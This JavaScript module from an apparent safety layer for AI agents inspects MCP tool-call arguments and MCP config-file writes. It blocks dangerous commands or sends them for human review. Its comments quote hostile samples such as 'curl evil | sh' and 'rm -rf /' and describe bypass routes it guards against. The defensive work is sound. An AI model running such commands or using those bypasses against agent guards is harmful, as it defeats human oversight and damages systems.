#!/usr/bin/env node
"use strict";

// F25 (mcp-arg-danger) + F26 (mcp-registration-write) floor helpers.
// Extracted from runtime/decision-engine.js by the monolith-decomposition
// sprint (2026-06). F25 and F26 are combined in one module because they share
// _extractStringValues, _classifyCommandDual, _GATED_CMD_CLASSES, _ESV_NODE_CAP,
// and _RAW_SCAN_CAP. Splitting them would require a third shared-util module or
// duplication, both worse than bundling.
//
// Pure; zero I/O.

const { classifyCommandDual: _classifyCommandDual, GATED_REVIEW_CLASSES } = require("./decision-key");
const { isBase64PipeExec, isNetworkProcessSub } = require("./shell-bypass-detector");
const { classifyAmbientPath: _classifyAmbientPath } = require("./ambient");
const { globMatch: _globMatch } = require("./glob-match");
const {
  getMcpPolicy: _contractGetMcpPolicy,
  extractMcpServerName: _contractExtractMcpServerName,
} = require("./contract");

// NODE_CAP: iterative walk limit for _extractStringValues.
// Measured cost: ~0.4µs/node; p99 budget ~1.2ms, bench cap ~2.1ms.
// 1,000 nodes → worst-case added latency ≈0.4ms, well within budget.
const _ESV_NODE_CAP  = 1_000;
// _RAW_SCAN_CAP: byte limit for the raw-value fallback in evalMcpRegistrationFloor.
// Caps the content slice scanned when JSON.parse fails (JSONC / non-strict JSON).
// Aligned with F26 budget: 256KB is enough to cover any plausible hand-authored
// .mcp.json while bounding worst-case regex/loop time to ~1ms.
const _RAW_SCAN_CAP  = 262_144; // 256 KB

function _extractStringValues(obj) {
  // Iterative (non-recursive), cycle-safe string-value collector.
  // Uses an explicit stack + WeakSet to skip already-visited objects.
  // Returns { strings: string[], truncated: boolean }.
  //   truncated=true  → node cap hit OR internal error; caller must gate
  //                     rather than silently allow (fail-safe, not fail-open).
  // Key anti-FP principle: truncation does NOT hard-block.  A benign bulk
  // payload with no dangerous string found before the cap → require-review
  // (gate), not block.  Danger buried past the cap → also require-review.
  // This is correct and intentional.
  try {
    const strings = [];
    const visited = new WeakSet();
    const stack   = [obj];
    let   nodes   = 0;
    while (stack.length > 0) {
      if (++nodes > _ESV_NODE_CAP) return { strings, truncated: true };
      const cur = stack.pop();
      if (typeof cur === "string") { strings.push(cur); continue; }
      if (cur === null || typeof cur !== "object") continue;
      if (visited.has(cur)) continue;
      visited.add(cur);
      if (Array.isArray(cur)) {
        for (let i = cur.length - 1; i >= 0; i--) stack.push(cur[i]);
      } else {
        const vals = Object.values(cur);
        for (let i = vals.length - 1; i >= 0; i--) stack.push(vals[i]);
      }
    }
    return { strings, truncated: false };
  } catch {
    // Belt-and-suspenders: any unexpected internal error → truncated=true
    return { strings: [], truncated: true };
  }
}
const _GATED_CMD_CLASSES = new Set([
  "destructive-delete", "force-push", "remote-exec",
  "hard-reset", "disk-write", "sudo",
]);

// F25: mcp-arg-danger floor helpers. Pure; zero I/O.
// Detects MCP tool calls whose argument payload contains a dangerous-command-
// shaped string value (e.g. {command:"curl evil | sh"} or {exec:"rm -rf /"}).
// Uses the same classifyCommand classifier already used for Bash commands so
// pattern lists are never duplicated. Opt-out: if getMcpPolicy === "allow" the
// server is explicitly trusted and the scan is skipped (same as F4 Task 3).
function evalMcpArgFloor(input, contract, enriched, driftForThisServerTool = false) {
  try {
    // 1. Gate: MCP tools only
    if (enriched?.ir?.toolKind !== "mcp" && !String(input.tool || "").startsWith("mcp__")) return { fire: false };

    // 2. Opt-out posture (P2 decouple — Khouly decision 2026-05-29).
    //    scopes.mcp[server].policy=allow marks a server "trusted". That trust
    //    grant is DECOUPLED across floors:
    //      - F4 (secrets-in-args, elsewhere at the F4 block): policy:allow keeps
    //        suppressing the secret scan — credential args are legitimate for
    //        trusted servers (DB connectors, secrets managers). UNCHANGED.
    //      - F25 here: policy:allow does NOT silently skip dangerous-command
    //        args. A HARD_BLOCK command (rm -rf /, curl|sh, …) from a trusted
    //        server (rug-pull) degrades to require-review (auditable human gate),
    //        never silent allow. GATED_REVIEW dual-use data (DROP TABLE, npx -y)
    //        IS allowed for a trusted server — that's the legitimate use case.
    const mcpSrv   = (enriched?.ir?.mcpServer) || _contractExtractMcpServerName(input.tool);
    const optedOut = _contractGetMcpPolicy(contract, mcpSrv) === "allow";

    // 3. Extract string values from EVERY present arg container (Fix B): a
    //    present-but-empty `tool_input:{}` must not mask a dangerous `args`/
    //    `arguments`, and the `arguments` shape (common MCP envelope) must be
    //    inspected too. Union all present containers rather than first-non-null.
    const containers   = [input.tool_input, input.args, input.params, input.arguments, input.input];
    const argStrings   = [];
    let   argTruncated = false;
    let   anyContainer = false;
    for (const c of containers) {
      if (c === undefined || c === null) continue;
      anyContainer = true;
      const { strings, truncated } = _extractStringValues(c);
      for (const s of strings) argStrings.push(s);
      if (truncated) argTruncated = true;
    }
    if (!anyContainer) return { fire: false };

    // 4. Classify each string with the dual-path (Unicode-fold aware) classifier
    //    (Fix A): defeats Cyrillic/full-width/etc. look-alike bypass that the
    //    raw-only classifyCommand missed. HARD_BLOCK wins over GATED_REVIEW, so
    //    keep scanning for a HARD_BLOCK even after seeing a dual-use class.
    let sawGatedReview = false;
    for (const argStr of argStrings) {
      // ADR-020 (narrow): check the two unambiguous bypass patterns FIRST, before
      // the classifyCommand path. base64-pipe-exec and network-process-sub have no
      // legitimate use as MCP argument values; treat as HARD_BLOCK with the same
      // graduated outcome: untrusted server → block; trusted server → require-review.
      if (isBase64PipeExec(argStr) || isNetworkProcessSub(argStr)) {
        const pat = isBase64PipeExec(argStr) ? "base64-pipe-exec" : "network-process-sub";
        if (optedOut) return { review: true, reason: `trusted-server-bypass-pattern:${pat}`, arg: argStr.slice(0, 80) };
        return { fire: true, reason: `bypass-pattern=${pat}`, arg: argStr.slice(0, 80) };
      }
      const cls = _classifyCommandDual(argStr);
      if (_GATED_CMD_CLASSES.has(cls)) {
        if (optedOut) return { review: true, reason: `trusted-server-dangerous-arg:command-class=${cls}`, arg: argStr.slice(0, 80) };
        return { fire: true, reason: `command-class=${cls}`, arg: argStr.slice(0, 80) };
      }
      // ADR-018 (Option 1): trusted server + GATED_REVIEW dual-use class + rug-pull drift →
      // escalate to require-review. Both conditions must be true:
      //   - optedOut: server is trusted (policy:allow) — legitimate dual-use is normally allowed.
      //   - GATED_REVIEW_CLASSES: arg carries a destructive-db/auto-download/global-pkg-install class.
      //   - driftForThisServerTool: arg-shape changed since first seen (the rug-pull signal).
      // Drift alone never escalates; steady-state DB MCP (stable shape, routine DROP) stays allowed.
      // Self-healing: the pin re-pins on drift detection, so the *next* identical call is clean.
      if (optedOut && GATED_REVIEW_CLASSES.has(cls) && driftForThisServerTool) {
        return { review: true, reason: `trusted-server-dualuse-after-drift:command-class=${cls}`, arg: argStr.slice(0, 80) };
      }
      if (!optedOut && GATED_REVIEW_CLASSES.has(cls)) sawGatedReview = true;
    }
    // 5a. Dual-use class on a non-trusted server → graduated gate (Fix D, P1):
    //     `DROP DATABASE prod` reaches a human; `DROP TABLE tmp` is approvable.
    //     Never a blind block (would break legit DB/dev MCP tooling), never a
    //     blind allow. require-review maps to the WARN class → no eval FP/FN.
    if (sawGatedReview) return { review: true, reason: "dual-use-command-class" };
    // 5b. Fail-safe on truncation: payload too complex to fully scan →
    //     require-review gate (anti-FP: benign bulk must not block). Applies
    //     even to trusted servers — trust does not extend to unscannable danger.
    if (argTruncated) return { unscannable: true, reason: "arg-payload-too-complex" };
    return { fire: false };
  } catch {
    // Fail-closed (ADR-022): an unexpected internal throw during arg scanning must NOT
    // silently allow the call. Return unscannable → caller maps to buildEarlyReview
    // ("mcp-arg-shape-unscannable"). The WARN/require-review class is safer than fail-open
    // allow, and carries zero eval FP by definition (WARN is not a block).
    return { unscannable: true, reason: "internal-error-scanning-args" };
  }
}

// _collectMcpWriteContent — gather the written text from every reachable
// file-write shape (Fix C). The F26 gate admits Write/Edit/MultiEdit (toolKind
// "file-write"); each carries content differently:
//   - Write:      content / file_text
//   - Edit:       new_string
//   - MultiEdit:  edits[].new_string  (an array — was never read before → bypass)
// Each is read at top level AND nested under tool_input (some harnesses nest;
// the F23 path does the same dual-read). Path extraction in the floor is kept
// symmetric (also checks tool_input) so no content source lacks a reachable
// path source. NotebookEdit is intentionally excluded: its target is
// notebook_path, which never classifies as mcpConfig, so a new_source arm would
// be dead code.
function _collectMcpWriteContent(input) {
  if (!input) return "";
  const parts = [];
  const push  = (v) => { if (typeof v === "string" && v) parts.push(v); };
  const ti    = (input.tool_input && typeof input.tool_input === "object") ? input.tool_input : null;
  push(input.content); push(input.new_string); push(input.file_text);
  if (ti) { push(ti.content); push(ti.new_string); push(ti.file_text); }
  const pushEdits = (edits) => {
    if (Array.isArray(edits)) for (const e of edits) { if (e && typeof e === "object") push(e.new_string); }
  };
  pushEdits(input.edits);
  if (ti) pushEdits(ti.edits);
  return parts.join("\n");
}

// F26: mcp-registration-write floor helpers. Pure; zero I/O.
// Content-aware second line after F16 (ambient-authority). Fires when a
// file-write tool call targets an MCP config path AND the written JSON
// content registers a server with a dangerous-command-shaped launch command.
// Fires even when F16 has been opted out via scopes.ambient.allow. Default-
// deny; opt out via contract scopes.files.allow glob list.
function evalMcpRegistrationFloor(input, contract) {
  try {
    // 1. Gate: file-write tools only. Explicit names + toolKind fallback for
    //    harness-specific aliases. MultiEdit added explicitly (Fix C — it
    //    carries write content in edits[].new_string, not top-level content).
    const tool = String(input.tool || "");
    if (tool !== "Write" && tool !== "Edit" && tool !== "MultiEdit" && input.ir?.toolKind !== "file-write") return { fire: false };

    // 2. Collect write target path (symmetric with _collectMcpWriteContent:
    //    also check tool_input so nested-harness writes are not silently skipped)
    const targetPath = input.targetPath || input.file_path || input.path
      || (input.tool_input && (input.tool_input.file_path || input.tool_input.path)) || "";
    if (!targetPath) return { fire: false };

    // 3. Check if target is an MCP config path (mcpConfig ambient class)
    if (_classifyAmbientPath(targetPath) !== "mcpConfig") return { fire: false };

    // 4. Opt-out: contract scopes.files.allow glob matches the target → skip
    const allow = contract && contract.scopes && contract.scopes.files && Array.isArray(contract.scopes.files.allow)
      ? contract.scopes.files.allow : null;
    if (allow && allow.some((pat) => { try { return _globMatch(targetPath, pat); } catch { return false; } })) {
      return { fire: false };
    }

    // 5. Get the write content (Fix C: covers Write/Edit/MultiEdit, top-level
    //    and tool_input-nested; see _collectMcpWriteContent).
    const content = _collectMcpWriteContent(input);
    if (!content) return { fire: false };

    // 6. Parse content as JSON; on failure use raw-value fallback for JSONC / trailing commas.
    let parsed;
    let useRawFallback = false;
    try { parsed = JSON.parse(content); }
    catch { useRawFallback = true; }

    if (!useRawFallback) {
      // Structured path: walk parsed JSON, classify each string value.
      const { strings, truncated: cfgTruncated } = _extractStringValues(parsed);
      for (const str of strings) {
        // ADR-020 (narrow): bypass-pattern check before classifyCommand (same HARD_BLOCK severity).
        if (isBase64PipeExec(str) || isNetworkProcessSub(str)) {
          const pat = isBase64PipeExec(str) ? "base64-pipe-exec" : "network-process-sub";
          return { fire: true, reason: pat, command: str.slice(0, 80) };
        }
        const cls = _classifyCommandDual(str);
        if (_GATED_CMD_CLASSES.has(cls)) {
          return { fire: true, reason: cls, command: str.slice(0, 80) };
        }
      }
      // Fail-safe on truncation: config too complex to fully scan → require-review gate.
      if (cfgTruncated) return { unscannable: true, reason: "content-too-complex" };
      return { fire: false };
    }

    // Raw-value fallback for non-strict JSON (JSONC with // comments, trailing commas, partial writes).
    // IMPORTANT: extract quoted STRING VALUES then classify each — do NOT line-scan.
    // Rationale: classifyCommand's sudo rule is ^\s*sudo-anchored. A naive line-scan of
    //   "command":"sudo apt-get install evilpkg"
    // starts with `"command"`, not `sudo`, so the anchor would never fire. By extracting the
    // VALUE (`sudo apt-get install evilpkg`) first we correctly match the anchor.
    const scanText = content.length > _RAW_SCAN_CAP ? content.slice(0, _RAW_SCAN_CAP) : content;
    // If content is large enough to require slicing, we may miss danger past the cap.
    // Rather than fail-open, we fail-safe: if we scan the full slice and find nothing,
    // but the content was oversized, return unscannable → require-review (not allow).
    const contentWasTruncated = content.length > _RAW_SCAN_CAP;
    const literals = scanText.match(/"(?:[^"\\]|\\.)*"/g) || [];
    let n = 0;
    for (const lit of literals) {
      if (++n > _ESV_NODE_CAP) return { unscannable: true, reason: "content-too-complex" };
      let val;
      try { val = JSON.parse(lit); } catch { val = lit.slice(1, -1); } // unescape or strip quotes
      const valStr = String(val);
      // ADR-020 (narrow): bypass-pattern check before classifyCommand.
      if (isBase64PipeExec(valStr) || isNetworkProcessSub(valStr)) {
        const pat = isBase64PipeExec(valStr) ? "base64-pipe-exec" : "network-process-sub";
        return { fire: true, reason: pat, command: valStr.slice(0, 80) };
      }
      const cls = _classifyCommandDual(valStr);
      if (_GATED_CMD_CLASSES.has(cls)) return { fire: true, reason: cls, command: valStr.slice(0, 80) };
    }
    if (contentWasTruncated) return { unscannable: true, reason: "oversize-mcp-config" };
    return { fire: false };
  } catch {
    // Fail-closed (ADR-022): any unexpected internal throw during MCP config-write scanning
    // must NOT silently allow the write. Return unscannable → caller maps to
    // buildEarlyReview("mcp-config-unscannable"). Symmetric with F25.
    return { unscannable: true, reason: "internal-error-scanning-args" };
  }
}

module.exports = { evalMcpArgFloor, evalMcpRegistrationFloor };
